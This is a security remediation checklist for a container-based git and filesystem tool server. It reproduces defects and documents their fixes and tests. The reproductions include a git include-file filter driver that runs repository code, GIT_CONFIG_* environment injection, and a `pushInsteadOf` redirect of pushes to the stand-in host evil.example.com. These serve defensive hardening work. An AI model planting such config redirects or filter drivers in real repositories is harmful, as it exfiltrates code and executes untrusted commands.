# Remediation TODO

**Spec:** `docs/REMEDIATION_SPEC.md` (RR-001..RR-033, RAT-001..RAT-020)
**Source:** code review of `docs/HARDENING_TODO.md` H1–H35, 2026-08-28

Eighteen defects found in the hardening work itself, including two ticked
checkboxes whose security control does not hold. Every defect was reproduced
against the running code before being written down; each task below carries the
reproduction so the implementer can re-run it rather than trust this file.

## How to work this list

Same discipline `docs/HARDENING_TODO.md` established, with two additions the
review's findings make necessary:

1. Implement the task.
2. **Write the adversarial test first, and watch it fail.** Thirteen of the
   eighteen defects had a passing test that was supposed to cover exactly that
   behavior — the tests selected inputs that happened to already work. A test
   written after the fix, against an input the fix obviously handles, is how
   this list came to exist.
3. Run the new test alone, then the relevant suite, then the full suite.
4. **Revert-verify:** back up the changed files, `git show HEAD:<file> > <file>`,
   confirm the new tests fail *for the right reason*, restore.
5. Lint, format, typecheck. Check for Docker leftovers.
6. Schema-drift check if any tool output changed; bump `CONTRACT_VERSION` per §33.2.
7. One task per commit. No `Co-Authored-By` trailers.
8. **Re-run every claim before writing it in the task's write-up.** RR-033 exists
   because H35's tracking table carried a mis-citation and an inaccurate defect
   description that were transcribed rather than verified.

---

## Phase 0 — Critical: security controls that do not hold

Both are ticked checkboxes in `docs/HARDENING_TODO.md`. Do these first.

### R1 — Configuration discovery expands includes ✅
**Satisfies:** RR-001 · **Verified by:** RAT-001, RAT-002
**Commit:** `2e83fcc`

- [x] Add `--includes` to both `git config --list` probes (`--local`, `--worktree`)
- [x] Add `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, `GIT_CONFIG_VALUE_<n>`,
      `GIT_CONFIG_PARAMETERS` to the environment scrub
- [x] Correct `git/service.py:103-111`'s "complete with respect to what can
      actually run" docstring — it is only complete *given* include expansion
- [x] Test both `include.path` and `includeIf.*.path`

**Defect (reproduced end-to-end).** `git/service.py:126-128` runs
`git config --list -z --local`, which does not expand includes. With
`.git/config` → `[include] path = evil.cfg`, `.git/evil.cfg` →
`[filter "sneaky"] clean = touch <marker>`, `.gitattributes` → `* filter=sneaky`:

```
_discover_code_executing_overrides(repo)  ->  []
read_git_diff(repo)                       ->  marker exists: True
```

Repository-supplied code executed as the daemon uid through the real `git_diff`
path. `--no-ext-diff --no-textconv` do not cover `filter.*`, so HR-002's stated
property does not hold.

**Note.** `run_git_host_side(repo, ['status'])` did *not* trigger it in the
reproduction (no working-tree change staged at that moment); `read_git_diff` did.
Do not conclude `git status` is safe — HR-002's own §4.2 records that
`git status` executes `filter.*.clean`. Test both.

**Implementation.** `--includes` added to both `_discover_code_executing_overrides`
scope-flag invocations (`--local`, `--worktree`) — verified this does not change
the function's existing fallback semantics (non-zero exit on "not a repository",
zero exit + normal listing otherwise; confirmed with real git 2.43.0 against a
non-repo directory and an empty repo before trusting it). `_ENV_VARS_TO_SCRUB`
gained `GIT_CONFIG_COUNT`/`GIT_CONFIG_PARAMETERS`; `GIT_CONFIG_KEY_<n>`/
`GIT_CONFIG_VALUE_<n>` are an unbounded per-index family, scrubbed by prefix
(`_ENV_VAR_PREFIXES_TO_SCRUB`) rather than a fixed tuple. Verified empirically
that this injection channel is real and independent of `--local`/`--worktree`
scope: `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=filter.x.clean
GIT_CONFIG_VALUE_0=... git config --list --includes` reports the injected key
regardless of the daemon's own `.git/config`.

**Verified the tests catch the regression:** reverted `git/service.py` to
`git show HEAD^` and reran the four new tests — all four failed, three with
"filter.sneaky(2).clean" absent from `_discover_code_executing_overrides`'s
return / the marker file existing after `run_git_host_side`, one (the
env-injection test) with the marker existing after `run_git_host_side` despite
the pre-fix scrub tuple not covering `GIT_CONFIG_KEY_0`. Restored; all 26 tests
in the file pass again. No Docker leftovers.

**Full relevant suite:** `tests/git/` + `tests/workspace/test_host_side_execution_safety.py`
+ `tests/workspace/test_git_diff_log_tools.py` (185 passed, includes real Docker) —
clean. `ruff check`, `ruff format --check`, `mypy src` clean across the whole
tree. No schema drift (no tool output shape changed). Full unscoped `tests/`
background run: 880 passed (876 before this task's 4 new tests), no
interruption, no Docker leftovers.

**New tests:** `tests/git/test_service.py` — `_discover_code_executing_overrides`
(direct, white-box) discovers a driver defined only through `include.path` and
through `includeIf.onbranch:<current-branch>.path`; `run_git_host_side` end to
end neutralizes a `filter.*.clean` driver bound via `.gitattributes` and defined
only through `include.path`, forced by a real `git diff` (the exact reproduction
that found the defect); `run_git_host_side` scrubs a `GIT_CONFIG_COUNT`/
`GIT_CONFIG_KEY_0`/`GIT_CONFIG_VALUE_0`-injected filter driver from a simulated
tainted daemon environment (`monkeypatch.setenv`), proven against a real
baseline subprocess call that confirms the injection mechanism itself works
before asserting the mediated call suppresses it.

### R2 — The push goes to the validated URL ✅ (partial — see below)
**Satisfies:** RR-002, RR-003 · **Verified by:** RAT-003, RAT-004
**Commit:** `652a6d7`

- [x] Substitute the resolved, validated URL into the push invocation instead of
      passing the remote name (`git/push.py:109`) — **superseded, see below**
- [x] Keep the existing host-side resolution — it is necessary, just not sufficient
- [ ] Assert the success audit record's `remote_repository` matches the
      destination actually contacted — **blocked, see below**
- [ ] Add the missing assertions for `refspec` and `remote_protection_status`
      — **blocked, see below**

**Defect (reproduced).** Validation runs host-side with
`GIT_CONFIG_GLOBAL=/dev/null`; the push runs in-container **by remote name**,
where Git re-resolves against `/etc/gitconfig` and `$HOME/.gitconfig`.
`entrypoint.sh:82` chowns `$HOME` to the container user. With
`~/.gitconfig` containing
`[url "https://evil.example.com/evil/other.git"] pushInsteadOf = https://github.com/owner/repo.git`:

```
daemon's host-side validation view : https://github.com/owner/repo.git      <- approved
container's view                   : https://evil.example.com/evil/other.git
git push --dry-run                 -> https://evil.example.com/evil/other.git/
```

HR-014 offered two remedies as alternatives; only the first was taken, and it
does not close the gap. The resulting audit record names the approved
destination, not the one reached.

**The originally-planned fix (URL substitution alone) does not work —
discovered empirically while implementing, not assumed.** `RR-002`'s own
"Note" claimed passing the resolved URL instead of the remote name closes the
TOCTOU because "the resolved value crosses the boundary rather than a name
re-resolved on the far side." Verified directly against git 2.43.0 before
trusting it: `url.<base>.pushInsteadOf` rewrites a *literal URL argument*
exactly as readily as a named remote —

```
git -c "url.<real>.pushInsteadOf=" push "<real-url>" ...   -> still redirected to evil.git
```

— the `-c` override doesn't neutralize it either: `pushInsteadOf` is a
multi-valued, prefix-matching key (every configured occurrence is checked
against the destination, not "the last one wins" the way a scalar key like
`filter.x.clean` is), so adding an empty override via `-c` just adds another
entry alongside the real one rather than replacing it. There is no git flag or
config override that disables `insteadOf` rewriting for one invocation. This
supersedes RR-002's own text, which is corrected by this task's R26 amendment.

**The actual fix: compare, don't just substitute.** `git remote get-url --push
<name>` is pure local configuration resolution — verified empirically to
return instantly even against an unresolvable hostname, no DNS lookup, no
connection. Run *in-container*, as the container user, immediately before the
real push, it tells the daemon exactly what the container's own git would
actually use — including any `pushInsteadOf`/`pushurl` redirect written to
`.git/config` or `$HOME/.gitconfig` through `exec`. Compared against the
host-side-validated identity (by normalized `owner/repo`, not raw string — see
below) and the push is refused, before `git push` itself ever runs, on any
disagreement. `validate_remote_identity_for_push` now returns a
`ValidatedPushRemote(repository, push_url)` instead of a bare `str`, so the
caller has the exact validated identity to compare against.

**A real false positive found and fixed before trusting the check.** The
first version compared raw URL strings and failed
`test_git_push_reaches_the_real_github_auth_stage_cleanly` — a *legitimate*
push, no attack involved. `entrypoint.sh:48` provisions a trusted, root-owned,
system-scope `url."git@github.com:".insteadOf "https://github.com/"` (S24) so
an HTTPS-authored origin pushes over the container's actual SSH key. The
host-side resolution deliberately blanks `GIT_CONFIG_SYSTEM` too (the host's
own `/etc/gitconfig` has nothing to do with this container), so it never sees
this rewrite, while the in-container resolution correctly applies it — a real
difference, not an attack. Comparing by **normalized identity**
(`normalize_to_owner_repo`) instead of raw string fixes this: `https://
github.com/owner/repo.git` and `git@github.com:owner/repo.git` normalize to
the same `owner/repo` and are accepted, while a redirect to an unrecognized
host or a different repository normalizes to a different value (or `None`)
and is rejected. The actual push now uses the in-container-resolved URL
(freshest possible value, confirmed a moment earlier to match), not the
host-side one.

**Blocked, same reason as AT-010/AT-027/AT-028's second halves.** The last two
checklist items need a *successful* structured `git_push` to inspect its
success-path audit record, and the structured tool restricts remotes to
`github.com` forms only (§20.2) — a genuine end-to-end success needs a real,
provisioned GitHub deploy key, which D3 deferred (manual provisioning, none
registered in this sandbox). Not faked with a mock: this codebase's entire
suite is real-Docker/real-git throughout (3 of 66 test files use any mock at
all), and a mocked "success" would prove nothing about the actual metadata
construction. Tracked as genuinely open, not silently dropped.

---

## Phase 1 — High: data loss and client-visible correctness

### R3 — `git_commit` refuses a path that is not a path ✅
**Satisfies:** RR-004 · **Verified by:** RAT-005
**Commit:** `37286c5`

- [x] Reject an empty-string entry, and any entry normalizing to the repository
      root (`""`, `"."`, `"./"`), with `INVALID_ARGUMENT`
- [x] Test each rejected form stages nothing — with `strict=False`, the default

**Defect (reproduced).** `tools/git.py:385` checks only `if not paths:` — a
non-empty list containing an empty string passes.
`build_add_argv([""])` → `['git', 'add', '--', ':(literal)']`, and real git 2.43
stages the entire working tree for that pathspec. `strict` mode catches it
incidentally (`normpath("") == "."`) but defaults to `False`.

Reproduced directly against a real repository before implementing anything:
`git add -- ':(literal)'` on a tree with one modified tracked file and one
untracked directory staged both — `git status --short` showed `A  sub/other.txt`
alongside `M  tracked.txt`, exactly the whole-tree stage the defect predicted.

**Implementation.** `git_commit_tool` now computes, immediately after the
existing `if not paths:` guard, the set of every path whose
`posixpath.normpath(...)` is `"."` — that's `""`, `"."`, `"./"`, and any
equivalent (`"a/.."`, etc.) — and raises `InvalidArgumentError` naming the
offending entries if the set is non-empty, before `git add` ever runs. The
check runs unconditionally (not just under `strict=True`), and inspects every
entry in the list rather than short-circuiting on the first — a caller who
names one real path and one root-normalizing path is still rejected, not
silently given a partial success.

**Verified the tests catch the regression.** Reverted `tools/git.py` to
`HEAD`, reran the 4 new tests alone: all failed with `DID NOT RAISE
ToolError` — every root-normalizing form (`""`, `"."`, `"./"`) plus the
mixed-with-a-real-path case reached `git add` unrejected on the pre-fix
code, matching the reproduction above. Restored the fix; all 4 pass again.

**Full relevant suite.** `tests/workspace/ tests/git/`: 502 passed.
Full unscoped suite: 886 passed. No Docker leftovers
(`docker ps -a --filter "name=mcp-dev-"` empty before and after).

**New tests.** `tests/workspace/test_git_commit_tool.py`:
`test_rr004_an_empty_or_root_normalizing_path_is_rejected_before_staging`
(parametrized over `""`, `"."`, `"./"`, each confirming both files stay
untracked and nothing is staged afterward) and
`test_rr004_a_root_normalizing_path_mixed_with_a_real_path_is_still_rejected`.

### R4 — A failed commit restores the index ✅
**Satisfies:** RR-005 · **Verified by:** RAT-006
**Commit:** `91af43a`

- [x] Restore each path's **prior index state**, not `HEAD`
- [x] Where the prior state cannot be restored faithfully, do not perform a
      destructive rollback — report the index as left dirty instead
- [x] Test with a path holding prior staged content distinct from HEAD

**Defect (reproduced — data loss).** `git/commit.py:69-79` runs
`git reset -- <paths>`, which resets to HEAD:

```
index BEFORE rollback: l1|STAGED|
index AFTER  rollback: l1|          <- caller's staged work destroyed
```

The write-up's empirical check confirmed other *paths* survive; it did not check
the same path's prior *content*. The test used a previously-untracked file, where
reset-to-HEAD is coincidentally correct.

Reproduced directly first: staged `v2-staged` over a tracked file's HEAD
content `v1`, then `git reset -- f.txt` — the index blob sha changed from
`v2-staged`'s to `v1`'s, exactly the destroyed-staged-work this task exists
to fix.

**Implementation.** `build_reset_argv` is gone, replaced by three pure
functions in `git/commit.py`: `build_capture_index_argv` (`git ls-files -z
--stage -- <pathspecs>`, run *before* `git add`, to snapshot exactly the
index entries this call is about to touch), `parse_index_entries` (parses
the `-z`-delimited `mode sha stage\tpath` triples), and
`build_restore_index_argv` (`git update-index --add --cacheinfo
mode,sha,path`, one flag per captured entry — verified empirically that
multiple `--cacheinfo` flags in one invocation each apply independently,
and that `--add` correctly restores a path whether it was merely modified
or fully unstaged by a staged deletion in between). `--cacheinfo`'s path
argument is a literal index path, not a pathspec — deliberately *not*
wrapped in `:(literal)`, since wrapping it would corrupt the path rather
than protect it, and it is never client-supplied here (only ever a path
`git ls-files` itself already resolved). `build_unstage_new_argv` (`git rm
--cached --ignore-unmatch`) handles the complementary case: a path present
in the post-`add` index but absent from the pre-`add` capture was not
staged before this call at all, so "restoring prior state" for it means
removing it from the index, not re-adding anything.

`git_commit_tool` captures before `git add` runs; on a commit failure, it
re-captures the post-`add` state, computes which paths are newly present
(unstage those) and restores every captured prior entry (`--cacheinfo`) —
covering the modified, newly-staged, and staged-deletion cases in one pass.
This is best-effort but never destructive on failure: if the pre-`add`
capture itself failed, or came back truncated
(`ExecResult.stdout_truncated` — checked, not assumed false, since a
truncated snapshot is not a faithful one), rollback is skipped entirely
and `index_left_dirty: true` is added to the raised error's `details`
instead of guessing. The same flag is `false` on a normal successful
restore. `git ls-files -z`'s NUL-delimited output also sidesteps a subtler
risk: `ExecResult`'s tail-based truncation (`response_tail_lines`, default
200) operates on newline-delimited lines, and a NUL-separated listing has
no newlines to split on, so a large listing is truncated only by the (10
MiB default) byte cap, never silently by line count.

**Verified the tests catch the regression.** Reverted `git/commit.py` and
`tools/git.py` to `HEAD`. The pure-function tests failed with
`ImportError: cannot import name 'build_capture_index_argv'` (an API-shape
failure, confirming the new functions don't exist pre-fix). The workspace
adversarial test — staging `v2-prior-staged` over a HEAD of `v1`, then
overwriting the worktree with a third value the failed commit's own `git
add` would stage — failed with `assert 'v1\n' == 'v2-prior-staged\n'`:
the pre-fix code reset all the way to HEAD, destroying the prior staged
content exactly as the reproduction predicted. Restored; all 48 tests
pass again.

**Full relevant suite.** `tests/workspace/ tests/git/`: 508 passed (first
attempt was killed with no output — a leftover container from the prior
run was still present; removed it and retried once, cleanly, per this
project's established fallback). Full unscoped suite: 892 passed.
No Docker leftovers.

**New tests.** `tests/git/test_commit.py`: pure-function tests for
`build_capture_index_argv`/`build_unstage_new_argv` (literal-pathspec
wrapping), `build_restore_index_argv` (one `--cacheinfo` flag per entry,
and — explicitly — that its path is *not* pathspec-escaped), and
`parse_index_entries` (parses real `-z --stage` output; empty input is
an empty list). `tests/workspace/test_git_commit_tool.py`:
`test_rr005_a_failed_commit_restores_prior_staged_content_not_head`
distinguishes HEAD's content, the content staged before the call (which
must survive), and the content the call's own `git add` staged over it
(which must not).

**Known gap.** The "cannot be restored faithfully → report dirty, don't
destroy" fallback path (`prior_entries is None`, or a truncated/failed
re-capture) is exercised by code review and the `None`-checks' own logic,
not by a forced-failure integration test — legitimately triggering a
`git ls-files` failure or truncation from black-box MCP calls, without
corrupting the repository out from under the rest of the suite, wasn't
found. Tracked honestly rather than left silently unverified.

### R5 — Every filesystem error is a typed `WorkspaceError` ✅
**Satisfies:** RR-006 · **Verified by:** RAT-007
**Commit:** `2aeff82`

- [x] Classify `FileNotFoundError`/`IsADirectoryError`/`PermissionError` from the
      raw `os.open` calls at `security.py:97` and `security.py:111`
- [x] Remove or reach the now-dead `S_ISDIR` check at `service.py:304-307`
- [x] Stop mapping every `OSError` from the `ensure_parent_directories` walk to
      `PathOutsideRepositoryError` (`security.py:155-159`) — `ENOTDIR` is not an escape
- [x] Move `resolve_open_fd` at `service.py:294` inside the `try` (the one fd in
      the file not covered by a handler)

**Defect (reproduced).** H9's fd rewrite regressed three previously-typed paths:

```
read_file(missing)           -> FileNotFoundError   UNTRANSLATED -> SDK crash
write_file(onto a directory) -> IsADirectoryError   UNTRANSLATED -> SDK crash
delete_file(missing parent)  -> FileNotFoundError   UNTRANSLATED -> SDK crash
```

All three returned `InvalidArgumentError` before H9 (`git show 4bfff54`).
`translate_workspace_errors` catches only `WorkspaceError`, so these reach the
client with no `code`, no `recoverable`, no `details`.

Reproduced directly first, calling `FilesystemService` methods against real
temp directories before writing any fix: `read_file("nope.txt")` raised
`builtins.FileNotFoundError` untranslated; `write_file("adir", ...)` where
`adir` already exists raised `builtins.IsADirectoryError`; `delete_file(
"nosuchdir/file.txt")` raised `builtins.FileNotFoundError` — all three exactly
as the write-up predicted.

**Also here (same file, same rewrite):**
- [x] `service.py:317-318`'s `os.pread(fd, existing_size, 0)` transfers at most
      `0x7ffff000` bytes, so a file over 2 GiB hashes short → spurious
      `FILE_CONFLICT`. Loop, or stream.
- [x] `service.py:347-348`'s `actual.unlink()` deletes by path string at a
      location outside the root after the fd is closed. Use
      `os.unlink(name, dir_fd=…)`.
- [x] Pre-existing but rewritten by H9: `delete_file("link")` on an in-repo
      symlink deletes the **target** and leaves the dangling link.

**Implementation.**

*Typed errors, not crashes.* A new `_open_classified` helper in
`security.py` wraps every raw `os.open` this module makes, translating
`FileNotFoundError`/`IsADirectoryError`/`NotADirectoryError`/`PermissionError`
into `InvalidArgumentError` — used by `open_validated` and the new
`open_parent_validated` (below). `write_file`'s own two `os.open` calls
(create-or-open, not routed through `FilesystemSecurity` at all) are
classified the same way inline.

*The dead `S_ISDIR` check.* Confirmed empirically before removing it:
`os.open(existing_directory, os.O_RDWR)` already raises `IsADirectoryError`
on Linux — the `stat.S_ISDIR(os.fstat(fd).st_mode)` check after it could
never actually run against a directory's fd. Removed; the now-classified
`IsADirectoryError` from the `os.open` call itself is what raises
`InvalidArgumentError` instead.

*`ensure_parent_directories`'s `ENOTDIR`.* Verified empirically that a
plain non-directory file blocking an intermediate component and a symlink
`O_NOFOLLOW` refuses to enter raise the *identical* `NotADirectoryError`/
`ENOTDIR` at the same call site — indistinguishable by exception type alone.
Fixed by checking directly (`os.lstat(part, dir_fd=dir_fd)`) which one
actually happened: a symlink is still reported as `PathOutsideRepositoryError`
(HR-011's actual concern); a plain file is `InvalidArgumentError` instead.
Either way the walk still refuses to proceed — this only changes which error
the client sees, never the fail-closed behavior itself — so an `lstat` that
itself fails defaults to the more serious "escape" wording.

*`resolve_open_fd` inside the `try`.* Moved so a (currently unreachable in
practice — an `os.readlink` on `/proc/self/fd/<fd>` for a descriptor this
same call just opened) failure no longer leaks `fd` uncaught. `actual: Path
| None = None` is initialized first; the cleanup branch only attempts to
unlink when `actual is not None`, and deliberately does *not* fall back to
guessing at a path string when it's `None` — that would reopen exactly the
race H9 exists to close.

*`os.pread`'s 2 GiB cap.* New `_hash_pread(fd, total_size, chunk_size=...)`
loops in `_READ_FILE_HASH_CHUNK_BYTES` pieces, the same way `read_file`'s own
hash pass already does, replacing the single unbounded `os.pread` call.
`chunk_size` is exposed only so a test can force multiple iterations without
an actual multi-gigabyte fixture.

*`actual.unlink()` → `dir_fd`-relative.* The cleanup-on-rejected-write path
now opens `actual.parent` and calls `os.unlink(actual.name, dir_fd=parent_fd)`,
narrowing the re-resolution race by one component compared to `Path.unlink()`'s
own fresh top-to-bottom walk of the whole string.

*The symlink-delete bug — the deepest finding in this task.* Traced to its
actual root cause, not just the symptom: `open_parent_validated` called
`self.resolve(relative_path)` on the **whole** path, and `resolve()` follows
symlinks (`Path.resolve()`) by design (that's what makes an escaping symlink
detectable at all). For a symlink final component, this silently returned
the **target**'s own parent and name, not the **link**'s — confirmed
empirically: for `link.txt -> target.txt`, `open_parent_validated("link.txt")`
returned `name == "target.txt"`. `delete_file`'s subsequent
`os.unlink(name, dir_fd=parent_fd)` is itself correctly symlink-safe (never
follows a symlink to delete), but with the wrong `name` handed to it, it
faithfully deleted the wrong thing. Fixed by resolving *only the parent*
through `self.resolve()` (symlink-following still correct and necessary
there — every intermediate component's containment must still hold) and
taking the final component **literally** from the client's own
`relative_path`, never through symlink-following resolution. Added a direct
`.git`-as-final-component rejection too, since `open_parent_validated` no
longer inherits that check from a full-path `resolve()` the way it used to
(its one current caller, `delete_file`, already gets this from its own
separate up-front `resolve()` call, but a future caller that skipped it
would otherwise silently regain access).

**Verified the tests catch the regression.** Reverted `security.py` and
`service.py` to `HEAD`, reran the 13 new tests: 10 failed for the expected
reasons (2 with `ImportError`/`AttributeError`-shaped failures, 8 with the
raw untranslated exceptions or the `target.txt`-instead-of-`link.txt`
substitution the reproductions predicted); 3 passed unchanged (the `.git`
final-component rejection, the symlink-blocks-`ensure_parent_directories`
case, and the small-file `expected_sha256` round trip — none of which this
task's fixes were meant to change the behavior of). Restored; all 89 tests
in the two files plus `tests/tools/test_filesystem.py` pass again.

**Full relevant suite.** `tests/filesystem/ tests/tools/
tests/workspace/test_host_side_execution_safety.py`: 125 passed (host-side
filesystem code — no Docker needed, no timeout risk). Full unscoped suite:
905 passed. No Docker leftovers.

**New tests.** `tests/filesystem/test_security.py`: `open_validated`/
`open_parent_validated` missing-path classification, the symlink-name
substitution bug (`open_parent_validated` on a symlink now returns the
link's own literal name), the `.git`-final-component rejection, and both
halves of the `ensure_parent_directories` `ENOTDIR` distinction (plain file
→ `InvalidArgumentError`, symlink → `PathOutsideRepositoryError`).
`tests/filesystem/test_service.py`: `write_file` onto a directory and
permission-denied (a real `chmod 0o000`, not mocked), `delete_file` missing
parent, `delete_file` on a symlink (asserts the target survives and the
link itself — via `os.path.lexists`, not just `.exists()` — is gone),
`ensure_parent_directories`'s plain-file case through the real `write_file`
entry point, `_hash_pread`'s chunking (an ordinary 10 KB file with
`chunk_size=777` forcing ~13 iterations, checked against a plain whole-file
hash), and an end-to-end `expected_sha256` round trip through `write_file`
using the real default chunk size, guarding against a future regression
back to a single unbounded `os.pread`.

### R6 — Enumeration survives any unreadable entry ✅
**Satisfies:** RR-007 · **Verified by:** RAT-008
**Commit:** `6cf1b06`

- [x] Catch `RuntimeError` (ELOOP) alongside the existing `WorkspaceError`
      handlers at `service.py:116-117` and `search.py:100-109`
- [x] Skip or per-entry-report the bad entry; never abort the listing
- [x] Test a symlink loop and a permission error, in both `list_files` and
      `search_files`

**Defect (reproduced).** Two mutually-referencing symlinks — trivially creatable
via `exec` — abort `list_files` entirely:

```
RuntimeError: Symlink loop from '/tmp/…/a'   UNTRANSLATED -> whole listing aborts
```

`Path.resolve()` raises `RuntimeError` on ELOOP in CPython 3.12, which is neither
`OSError` nor a `WorkspaceError`. `search_files` survives only incidentally
(`candidate.is_file()` is `False` for a loop) — that is luck, not coverage.

Reproduced directly first: two mutually-referencing symlinks (`a -> b`,
`b -> a`) plus one ordinary file, `list_files("")` raised
`builtins.RuntimeError: Symlink loop from '.../a'` uncaught, exactly as
predicted; `search_files` on the same tree survived (confirming the "luck"
claim empirically rather than trusting it).

**Implementation.** Traced the crash to its exact origin, not just the
symptom `list_files`'s bare loop body suggests: `_is_git_metadata` is the
only thing in `list_files`'s per-candidate loop that can raise at all
(`_describe` cannot — for a loop, `path.exists()` returns `False`, an
`OSError` it already catches internally, short-circuiting before its own
`path.resolve()` call would run). `_is_git_metadata`'s `except
PathOutsideRepositoryError` became `except (PathOutsideRepositoryError,
RuntimeError)`, treating a symlink loop the same way as an escaping
symlink — not Git metadata, reported as a plain `type="symlink"` entry by
`_describe` (which already handles a symlink whose target can't be
confirmed within the root, and a loop is exactly that). `search_files`
gained `except RuntimeError: continue` alongside its existing
`PathOutsideRepositoryError` handler, for the same reproduced call
(`security.resolve(relative)`) — genuine defensive coverage even though,
confirmed via revert-verification below, today's `is_file()`-before-
`resolve()` check ordering already prevents a *pure* symlink loop from
ever reaching it in practice.

**The permission-error half of the checklist needed no production fix.**
Traced (not assumed) before writing any test: `Path.resolve()` — what
`FilesystemSecurity.resolve()` uses, non-strict by default — does not
raise for an unreadable intermediate directory the way `resolve(strict=
True)`/`stat()` do (confirmed empirically: `os.open` on the same path
correctly raises `PermissionError` at the kernel level, but non-strict
`resolve()` doesn't surface it). Separately, `Path.rglob()`/`iterdir()`
already swallow a `PermissionError` internally when descending into an
unreadable subdirectory rather than propagating it (confirmed
empirically: a `chmod 0o000` subdirectory is silently not descended into,
no exception). Both `list_files` and `search_files` were already safe
against this case — the checklist's "test a permission error" is
satisfied by adding real coverage for already-correct behavior, not by
changing it, since changing correct behavior wasn't warranted.

**Verified the tests catch the regression.** Reverted `service.py` and
`search.py` to `HEAD`, reran the 4 new tests: `list_files`'s symlink-loop
test failed with the exact reproduced `RuntimeError`, uncaught, at
`_is_git_metadata`; the other 3 (both unreadable-subdirectory tests, and
`search_files`'s symlink-loop test) passed unchanged on the reverted
code too — honestly expected, not a gap: the permission tests exercise
behavior this task's fix never needed to change, and `search_files`'s own
existing check ordering already protects it from this exact input
independent of the new `except RuntimeError` clause (which the write-up
above already documents as defensive-only, added because relying on that
ordering is fragile, not because today's specific test can currently
defeat it). Restored; all 72 tests in the two files pass again.

**Full relevant suite.** `tests/filesystem/ tests/tools/`: 125 passed
(host-side, no Docker needed). Full unscoped suite: 909 passed. No
Docker leftovers.

**New tests.** `tests/filesystem/test_service.py`:
`test_rr007_list_files_survives_a_symlink_loop` (the real defect —
confirms the rest of the listing is unaffected and the loop's own two
entries are reported as `type="symlink"`),
`test_rr007_list_files_survives_an_unreadable_subdirectory` (the locked
directory itself is still listed; its contents are not).
`tests/filesystem/test_search.py`: the same two scenarios for
`search_files`, using a unique marker string per test so an unrelated
match in the shared `_repo` fixture's other files can't produce a false
pass.

### R7 — A diagnostic cannot fail the operation it annotates ✅
**Satisfies:** RR-008 · **Verified by:** RAT-009
**Commit:** `3498181`

- [x] Guard the response type in `_query_branch_rules` / `verify_remote_protection`
- [x] Degrade to `unverified` with a reason for any unexpected shape
- [x] Test a `200` returning a JSON object rather than an array

**Defect (reproduced — introduced by H32).** The rewrite iterates the parsed body
without a type guard:

```
*** RAISED AttributeError: 'str' object has no attribute 'get'
```

The exception escapes `verify_remote_protection`, escapes `workspace_open`, and
passes `translate_workspace_errors` uncaught — violating the function's own
"never raises" docstring, §18.5's "a diagnostic SHALL NOT fail `workspace_open`
by itself", and HR-022. Reachable through a misconfigured `api_base_url`.

Reproduced directly first, against a real local HTTP server (this suite's own
established substitute for `api.github.com`, not a mock): a `200` response
whose body is `{"message": "not an array"}` raised exactly the predicted
`AttributeError`, uncaught. A closely-related second crash, found while
reproducing the first rather than assumed: a genuinely non-JSON body (e.g. an
HTML error page from a misconfigured `api_base_url` pointing at a different
server entirely) raised `json.JSONDecodeError` uncaught too — `json.loads`
itself has no shape guard at all.

**Also here:** `_query_branch_rules` does not paginate. A branch with more than
one page of rules under-reports, which with `require_remote_protection: deny`
blocks legitimate work. Either paginate or set `per_page` and document the bound.

**Implementation.** `_query_branch_rules` now validates the parsed body is a
`list` of `dict`s before returning it, raising `ValueError` with a clear
message otherwise (naming the offending type). `verify_remote_protection`
gained `except ValueError` alongside its existing `HTTPError`/`URLError`
handlers, degrading to `unverified` with the reason — and since
`json.JSONDecodeError` is itself a `ValueError` subclass, this same new
handler closes the non-JSON-body crash too, for free, as a natural
consequence rather than a second special case. The request URL also gained
`?per_page=100` (GitHub's documented maximum, not its default of 30): the
endpoint's response is the combined, deduplicated set of rule *types* that
apply to the branch, which the docstring's own ~23-type ceiling makes
unconditionally boundable by a single 100-item page — this is sizing one
page past a fixed, documented upper bound, not a partial substitute for
real pagination.

**A real, pre-existing test-fixture bug found and fixed along the way.**
Adding the shape guard broke 3 previously-passing tests in
`tests/workspace/test_remote_protection.py` — its own separate
`_FakeGitHubHandler.do_GET` wrote `json.dumps(self.response_body or {})`,
and `or {}` silently turns a deliberately empty *list*
(`response_body = []`, used by exactly the tests that broke, to simulate
"no rules apply") into an empty JSON *object* on the wire, since `[]` is
falsy in Python. This bug already existed on `HEAD`, sending `{}` instead of
the intended `[]` the whole time — it had no observable effect before this
task only because the pre-fix `_query_branch_rules` performed no shape
validation at all, and an empty dict and an empty list both iterate to zero
rule types regardless. RR-008's new validation correctly rejected the `{}`
shape once it could tell the difference, which is what turned this latent
fixture bug into a visible test failure rather than introducing a new one —
confirmed by reverting only the production code and rerunning: the fixed
fixture (now genuinely sending `[]`) still failed against `HEAD` in exactly
the way that reveals `HEAD`'s own missing `?per_page=100`, which is the
correct, expected result. Fixed the fixture to match
`tests/test_github_api.py`'s own already-correct `if ... is not None else
{}` pattern; updated the one exact-path assertion the new query string
affects.

**Verified the tests catch the regression.** Reverted `github_api.py` to
`HEAD`, reran `tests/test_github_api.py` + `tests/workspace/
test_remote_protection.py`: 6 failed — the 5 new/updated
`tests/test_github_api.py` cases (the two shape-guard reproductions, the
`?per_page=100` assertion, and the object-vs-list variants) plus the one
`test_remote_protection.py` test whose fixture bug this task's validation
now surfaces — all for the reasons above, none unexpected. Restored; all 24
tests across the two files pass again.

**Full relevant suite.** `tests/test_github_api.py tests/config/
tests/db/test_schema.py tests/workspace/test_remote_protection.py`: 73
passed. Full unscoped suite: 912 passed, 1 failed
(`test_ssh_client_config.py::test_at_034_substituted_host_key_fails_closed_no_prompt`,
`COMMAND_TIMEOUT` on an unrelated `ssh-keyscan` call — this task touches only
`github_api.py`, nothing SSH/exec/timeout-related). Reran that one test alone
twice: failed once more with the same timeout, then passed cleanly
(21.89s) — a transient environmental flake, not a regression, consistent
with this test's contention-sensitivity already observed earlier in this
session. No Docker leftovers.

**New tests.** `tests/test_github_api.py`: `test_rr008_requests_per_page_
100_not_githubs_default_of_30`, `test_rr008_unverified_when_the_response_
body_is_a_json_object_not_an_array`, `test_rr008_unverified_when_a_list_
item_is_not_an_object`, `test_rr008_unverified_when_the_response_body_is_
not_json_at_all` (the fixture gained a `raw_response_body` override for
this last one, since the existing `response_body` field is always run
through `json.dumps` and can't produce malformed JSON on its own). One
existing test's exact-path assertion updated for the new query string.

---

## Phase 2 — High: authorization and lifecycle

### R8 — Job-scoped tools re-check authorization ✅
**Satisfies:** RR-010, RR-011 · **Verified by:** RAT-011
**Commit:** `caadabd`

- [x] Re-check in `exec_status_tool`, `exec_output_tool`, `exec_cancel_tool` —
      resolve `job_id` → `workspace_id` → `get_authorized`
